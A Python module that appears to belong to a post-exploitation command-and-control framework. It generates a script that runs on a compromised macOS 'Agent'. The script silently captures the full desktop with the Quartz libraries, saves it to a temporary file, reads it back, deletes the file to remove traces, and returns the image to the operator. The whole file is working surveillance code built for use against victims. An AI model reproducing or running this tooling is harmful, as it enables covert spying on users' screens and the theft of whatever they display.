class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'NativeScreenshot',

            # list of one or more authors for the module
            'Author': ['@xorrior'],

            # more verbose multi-line description of the module
            'Description': ('Takes a screenshot of an OSX desktop using the Python Quartz libraries and returns the data.'),

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            'OutputExtension': "png",

            # if the module needs administrative privileges
            'NeedsAdmin': False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': False,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'SavePath': {
                'Description'   :   'Path of the temporary screenshot file to save.',
                'Required'      :   True,
                'Value'         :   '/tmp/out.png'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self):

        savePath = self.options['SavePath']['Value']

        script = """
import Foundation
import Quartz
import Quartz.CoreGraphics as CG
from Cocoa import NSURL
import LaunchServices

region = CG.CGRectInfinite
path = '%s'
image = CG.CGWindowListCreateImage(region, CG.kCGWindowListOptionOnScreenOnly, CG.kCGNullWindowID, CG.kCGWindowImageDefault)
imagepath = NSURL.fileURLWithPath_(path)
dest = Quartz.CGImageDestinationCreateWithURL(
    imagepath,
    LaunchServices.kUTTypePNG,
    1,
    None)
properties = {
    Quartz.kCGImagePropertyDPIWidth: 1024,
    Quartz.kCGImagePropertyDPIHeight: 720,
}

Quartz.CGImageDestinationAddImage(dest, image, properties)
Quartz.CGImageDestinationFinalize(dest)

f = open(path, 'rb')
data = f.read()
f.close()
run_command('rm -f %s')
print data
""" % (savePath, savePath)

        return script
